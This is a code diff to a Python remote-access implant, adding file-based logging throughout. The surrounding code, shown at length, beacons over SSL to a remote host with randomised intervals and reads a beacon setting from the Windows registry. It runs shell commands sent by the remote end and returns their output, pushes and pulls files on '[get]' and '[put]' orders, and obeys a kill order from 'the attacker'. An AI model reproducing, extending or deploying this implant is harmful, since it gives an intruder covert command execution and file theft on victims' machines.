@@ -30,6 +30,8 @@ remote_port = 8081
 server_sni_hostname = ''
 VERBOSE = True
 DEBUG = True
+OUTPUT_FILE = True
+
 DEVNULL = subprocess.DEVNULL
 BEACON_INTERVAL_DEFAULT = 30    #in seconds
 BEACON_INTERVAL_MEM = BEACON_INTERVAL_DEFAULT
@@ -38,20 +40,40 @@ BEACON_INTERVAL_SETTING = BEACON_INTERVAL_DEFAULT
 CURRENT_WORKING_DIR = getcwd()
 RECONNECT_ATTEMPTS = 5 #immediately upon disconnect
 
-if VERBOSE:
+def get_time():
+    now = datetime.now()
+    current_time = now.strftime("%H:%M:%S")
+    return current_time
+
+def log_line(line):
+    with open("log","a+") as log_file:
+        log = get_time() + " " + line
+        log_file.write(log+"\n")
+
+if DEBUG:
     #set working directory to script location
-    print("Current Working Directory: ",getcwd())
+    log = "Current Working Directory: " + getcwd()
+    print(log)
+    if OUTPUT_FILE:
+        log_line(log)
 chdir(path.dirname(argv[0]))
-if VERBOSE:
-    print("New Working Directory: ",getcwd())
+if DEBUG:
+    log = "New Working Directory: " + getcwd()
+    print(log)
+    if OUTPUT_FILE:
+        log_line(log)
 try:
     if name  == "nt":
         winreg_exists = util.find_spec('winreg')
         if winreg_exists:
             import winreg
 except:
-    if VERBOSE:
+    if DEBUG:
         print_warn(exc_info())
+        
+    if OUTPUT_FILE:
+        log_line(exc_info())
+        
 
 def create_keys():
     server_cert ='''\
@@ -84,6 +106,11 @@ H1fwfP6xGzn/UjUTNWuz
             print_fail("Unable to create server key")
             print(getcwd())
             print(exc_info())
+            if OUTPUT_FILE:       
+                log_line("Unable to create server key")
+                log_line(getcwd())
+                log_line(exc_info())
+                
 
     client_cert = '''\
 -----BEGIN CERTIFICATE-----
@@ -115,6 +142,10 @@ z/BKKDg5xkjlf0TAyaAo
             print_fail("Unable to create client cert")
             print(getcwd())
             print(exc_info())
+            if OUTPUT_FILE:       
+                log_line("Unable to create client cert")
+                log_line(getcwd())
+                log_line(exc_info())
     client_key= '''\
 -----BEGIN PRIVATE KEY-----
 MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQClYnr6PZrghUhx
@@ -152,9 +183,15 @@ TZdCKivQ2PsE9Uw8BwCZYJI=
             print_fail("Unable to create client key")
             print(getcwd())
             print(exc_info())
+            if OUTPUT_FILE:       
+                log_line("Unable to create client key")
+                log_line(getcwd())
+                log_line(exc_info())
 
 def push_uuid(conn):
     send_data(conn, UUID)
+
+
 
 def get_system_time(conn):
     now = datetime.now()
@@ -169,6 +206,9 @@ def delete_keys():
     except FileNotFoundError:
         if DEBUG:
             print_warn("Unable to Delete SSL Keys")
+            if OUTPUT_FILE:       
+                log_line("Unable to Delete SSL Keys")
+            
 
 def sysinfo():
     date_time = datetime.fromtimestamp(time()).strftime('%Y-%m-%d %H:%M:%S')
@@ -198,6 +238,9 @@ def base64_encode(message):
         if DEBUG:
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+            if OUTPUT_FILE:
+                log_line(e)       
+                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
     
 
 def send_data(conn, plain_text):
@@ -209,12 +252,18 @@ def send_data(conn, plain_text):
         conn.send(base64_msg.encode('utf-8'))
 
     except Exception as e:
-        if VERBOSE:
+        if DEBUG:
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
             print_fail("Connection Interrupted - Unable to Send")
+            if OUTPUT_FILE:
+                log_line(e)       
+                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+                log_line("Connection Interrupted - Unable to Send")
     if VERBOSE:
         print_info("Sent:\n"  +plain_text)
+        if OUTPUT_FILE:
+            log_line("Sent:\n"  +plain_text)
 
 def file_transfer_get(conn, file_name):      #push to server - response from a 'get'
     filesize = path.getsize(file_name)
@@ -226,8 +275,12 @@ def file_transfer_get(conn, file_name):      #push to server - response from a '
     except:
         if VERBOSE:
             print_fail("IO Error, Unable to Read File for Transfer")
+            if OUTPUT_FILE:
+                log_line("IO Error, Unable to Read File for Transfer")
     if VERBOSE:
         print_info("Sending File: " + file_name)
+        if OUTPUT_FILE:
+            log_line("Sending File: " + file_name)
     try:
         with open(file_name, "rb") as f:
             bytes_read = f.read(1024)
@@ -237,11 +290,17 @@ def file_transfer_get(conn, file_name):      #push to server - response from a '
         conn.send("[END]".encode('utf-8'))
         if VERBOSE:
             print_info("Done!")
+            if OUTPUT_FILE:
+                log_line("Fished Sending File!")
 
     except Exception as e:
         if DEBUG:
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+            if OUTPUT_FILE:
+                log_line(e)       
+                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+
 
 def file_transfer_put(conn, file_name):     #download from server - response from a 'put'
     file_name = file_name.rstrip("[END]")
@@ -249,12 +308,16 @@ def file_transfer_put(conn, file_name):     #download from server - response fro
         f = open(file_name,'wb')
         if VERBOSE:
             print_info("Receiving --> {}".format(file_name))
+            if OUTPUT_FILE:
+                log_line("Receiving --> {}".format(file_name))
         while True: 
             data = conn.recv(1024)
             if data.endswith(b"[END]"):
                 f.write(data.rstrip(b"[END]"))
                 if VERBOSE:
                     print_good("Transfer completed")
+                    if OUTPUT_FILE:
+                        log_line("Transfer completed")
                 f.close()
                 break
             else:
@@ -264,13 +327,15 @@ def file_transfer_put(conn, file_name):     #download from server - response fro
         if DEBUG:
             print_fail("IO Error - Unable to Write File from Server")
             send_data(conn, "INVALID DESTINATION PATH")
-
+            if OUTPUT_FILE:
+                log_line("IO Error - Unable to Write File from Server")
 def get_cwd():
     global CURRENT_WORKING_DIR
     CURRENT_WORKING_DIR = getcwd()
     if VERBOSE:
         print_info("PWD: {}".format(CURRENT_WORKING_DIR))
-
+        if OUTPUT_FILE:
+            log_line("PWD: {}".format(CURRENT_WORKING_DIR))
 def get_user():
     username = getuser()
     return username
@@ -283,6 +348,9 @@ def change_cwd(path):
         if DEBUG:
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+            if OUTPUT_FILE:
+                log_line(e)       
+                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
     return CURRENT_WORKING_DIR
 
 def beacon(conn, data):
@@ -308,17 +376,25 @@ def beacon(conn, data):
         if DEBUG:
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+            if OUTPUT_FILE:
+                log_line(e)       
+                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
 
 def kill_term(conn):
     try:
         if VERBOSE:
             print_warn("Received kill command")
+            if OUTPUT_FILE:
+                log_line("Received kill command")
         conn.close()
         kill(getpid(), SIGTERM)
     except Exception as e:
         if DEBUG:
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+            if OUTPUT_FILE:
+                log_line(e)       
+                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
 
 def callback_port(conn,data):
     global remote_port
@@ -333,6 +409,10 @@ def callback_port(conn,data):
             if DEBUG:
                 print_fail("Unable to change callback port")
                 print(e)
+                if OUTPUT_FILE:
+                    log_line(e)
+                    log_line("Unable to change callback port")
+                    log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
 
 def connect(remote_ip=remote_ip, remote_port=remote_port):
     global RECONNECT_ATTEMPTS
@@ -355,14 +435,21 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
         if DEBUG:
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+            if OUTPUT_FILE:
+                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
     try:
         if VERBOSE:
             print_info("Trying to connect --> {}:{}".format(remote_ip,remote_port))
+            if OUTPUT_FILE:
+                log_line("Trying to connect --> {}:{}".format(remote_ip,remote_port))
         conn.connect((remote_ip, remote_port))
         
         if VERBOSE:
             print_good("Connected!")
             print_good("SSL established. Peer: {}".format(conn.getpeercert()))
+            if OUTPUT_FILE:
+                log_line("Connected!")
+                log_line("SSL established. Peer: {}".format(conn.getpeercert()))
         RECONNECT_ATTEMPTS = 5
         get_cwd()
     except ConnectionRefusedError:
@@ -371,6 +458,9 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
         if DEBUG:
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+            if OUTPUT_FILE:
+                log_line(e)       
+                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
     sock_desc_tracker = []
     try:
         while True:
@@ -380,6 +470,8 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                     if len(set(sock_desc_tracker)) == 1:
                         if VERBOSE:
                             print_fail("Lost Connection --> Count: {}".format(len(sock_desc_tracker)))
+                            if OUTPUT_FILE:
+                                log_line("Lost Connection --> Count: {}".format(len(sock_desc_tracker)))
                         raise ConnectionResetError
                 sock_desc_tracker.append(int(conn.fileno()))
                 recv = conn.recv(1024)
@@ -390,6 +482,8 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
             data = data[:-5].strip('\n')
             if VERBOSE:
                 print_info("Received:\n" + data)
+                if OUTPUT_FILE:
+                    log_line("Received:\n" + data)
             if '[kill]' == data: # if we got terminate order from the attacker, close the socket and break the loop
                 kill_term(conn)
                 break
@@ -408,31 +502,45 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
             elif "[get]" in data:  #find file locally then push to remote server
                 if VERBOSE:
                     print_info("Received GET")
+                    if OUTPUT_FILE:
+                        log_line("Received GET")
                 file_name = data.split()[1].strip("[END]")
                 if path.exists(file_name):
                     if VERBOSE:
                         print_info("File Found! :) --> {}".format(file_name))
+                        if OUTPUT_FILE:
+                            log_line("File Found! :) --> {}".format(file_name))
                     send_data(conn, "[file-found]")
                     data = ""
                     while not data.endswith('[END]'):
                         if DEBUG:
                             print("Waiting to Transfer...")
+                            if OUTPUT_FILE:
+                                log_line("Waiting to Transfer...")
                         data = conn.recv(1024).decode('utf-8')
                         if DEBUG:
                             print("DATA: {}".format(data))
-                        
+                            if OUTPUT_FILE:
+                                log_line("DATA: {}".format(data))
                     if "[transfer]" in data:
                         if VERBOSE:
                             print_info("Beginning Transfer!")
+                            if OUTPUT_FILE:
+                                log_line("Beginning Transfer!")
                         file_transfer_get(conn, file_name)
                 else:
                     if VERBOSE:
                         print_info("File not Found :( --> {}".format(file_name))
+                        if OUTPUT_FILE:
+                            log_line("File not Found :( --> {}".format(file_name))
+
                     send_data(conn, "[file-not-found]")
                 data = ""
             elif "[put]" in data:
                 if VERBOSE:
                     print_info("Received PUT")
+                    if OUTPUT_FILE:
+                        log_line("Received PUT")
                 file_name = data.split()[2]
                 file_transfer_put(conn, file_name)
             elif data == "sysinfo":
@@ -446,6 +554,8 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                 #cmds = data.split()
                 if VERBOSE:
                     print_info("Received cmd --> {}".format(data))
+                    if OUTPUT_FILE:
+                        log_line("Received cmd --> {}".format(data))
                 if data.startswith("start "):
                     try:
                         output = subprocess.call(data.split(" "), timeout=10, shell=True, stdin=subprocess.DEVNULL,stderr=subprocess.DEVNULL,stdout=subprocess.DEVNULL)
@@ -453,6 +563,8 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                     except subprocess.TimeoutExpired:
                         if VERBOSE:
                             print_warn("Command Execution Timeout Expired")
+                            if OUTPUT_FILE:
+                                log_line("Command Execution Timeout Expired")
                         send_data(conn, "Command Execution Timeout Expired")
                     
                 else:
@@ -467,20 +579,30 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                                 send_data(conn, output.stdout.decode('utf-8')) # send back the result
                             except UnicodeDecodeError:
                                 send_data(conn, output.stdout.decode('cp1251')) # send back the result
+                                if OUTPUT_FILE:
+                                    log_line("UNICODE ERROR")
                     except subprocess.TimeoutExpired:
                         if VERBOSE:
                             print_warn("Command Execution Timeout Expired")
+                            if OUTPUT_FILE:
+                                log_line("Command Execution Timeout Expired")
                         send_data(conn, "Command Execution Timeout Expired")
                     except Exception as e:
                         if DEBUG:
                             print_fail("Exception! --> {}".format(e))
                             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+                            if OUTPUT_FILE:
+                                log_line(e)       
+                                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
                         send_data(conn,e)
                 data = "" #reset the data received
     except Exception as e:
         if DEBUG:
             print(e)
             print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+            if OUTPUT_FILE:
+                log_line(e)       
+                log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
 
 
 def query_beacon():
@@ -492,6 +614,8 @@ def query_beacon():
         BEACON_INTERVAL_HDD = int(winreg.QueryValue(k,None))
         if VERBOSE:
             print_info("Found Registry Beacon Setting: {}".format(BEACON_INTERVAL_HDD))
+            if OUTPUT_FILE:
+                log_line("Found Registry Beacon Setting: {}".format(BEACON_INTERVAL_HDD))
         BEACON_INTERVAL_SETTING = BEACON_INTERVAL_HDD
     except:
         BEACON_INTERVAL_SETTING = BEACON_INTERVAL_MEM
@@ -501,19 +625,25 @@ def beacon_drift(value=30):
     right_bound = 10
     if VERBOSE:
         print_info("Current Beacon Setting is: {} seconds".format(value))
+        if OUTPUT_FILE:
+            log_line("Current Beacon Setting is: {} seconds".format(value))
     try:
         left_bound = round(uniform(.95, 1) * value)
         right_bound = round(uniform(1, 1.05) * value)
     except:
         if VERBOSE:
             print_warn("Unable to Calculate a good drift, defaulting to more predictable version")
-
+            if OUTPUT_FILE:
+                log_line("Unable to Calculate a good drift, defaulting to more predictable version")
         left_bound = round(choice([.95,.97,.99, 1]) * value)
         right_bound = round(choice([1,1.02,1.04, 1.05]) * value)
     new_interval = randint(left_bound, right_bound)
     if VERBOSE:
         print_info("New Beacon Value is: {} seconds".format(new_interval))
         print_info("REMOTE_HOST: {}:{}".format(remote_ip,remote_port))
+        if OUTPUT_FILE:
+            log_line("New Beacon Value is: {} seconds".format(new_interval))
+            log_line("REMOTE_HOST: {}:{}".format(remote_ip,remote_port))
     return new_interval
 
 def main():
@@ -541,6 +671,9 @@ def main():
             if VERBOSE:
                 print_fail("Failed to connect")
                 print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+                if OUTPUT_FILE:
+                    log_line("Failed to connect")       
+                    log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
         except ConnectionResetError:
             if BEACON_INTERVAL_MEM is not None:
                 BEACON_INTERVAL_SETTING = BEACON_INTERVAL_MEM
@@ -551,12 +684,18 @@ def main():
             if DEBUG:
                 print_fail("Remote end terminated the connection")
                 print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+                if OUTPUT_FILE:
+                    log_line("Remote end terminated the connection")       
+                    log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
         except ConnectionAbortedError:
             exit()
         except Exception as e:
             if DEBUG:
                 print(e)
                 print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+                if OUTPUT_FILE:
+                    log_line(e)
+                    log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
         finally:
             delete_keys()
             if BEACON_INTERVAL_SETTING is None:
@@ -569,20 +708,30 @@ def main():
                     if VERBOSE:
                         print_info("Reconnecting...")
                         print_info(f"Remaining Reconnect Attempts Before Drift: {RECONNECT_ATTEMPTS}")
+                        if OUTPUT_FILE:
+                            log_line("Reconnecting...")
+                            log_line(f"Remaining Reconnect Attempts Before Drift: {RECONNECT_ATTEMPTS}")
                 else:
                     if VERBOSE:
                         print_info("Sleeping for {}".format(drift))
+                        if OUTPUT_FILE:
+                            log_line("Sleeping for {}".format(drift))
                     sleep(drift)
                     
             except KeyboardInterrupt:
                 if VERBOSE:
                     print_warn("Received Keyboard Interrupt")
+                    if OUTPUT_FILE:
+                        log_line("Received Keyboard Interrupt")
                 exit(0)
             except Exception as e:
                 if VERBOSE:
                     print_fail("Critical Failure, Exiting")
                     print(e)
                     print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+                    if OUTPUT_FILE:
+                        log_line(e)
+                        log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
                 else:
                     pass
 try:
@@ -591,3 +740,6 @@ except:
     if DEBUG:
         print(exc_info())
         print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
+        if OUTPUT_FILE:
+            log_line(exc_info())
+            log_line("Error on Line:{}".format(exc_info()[-1].tb_lineno))
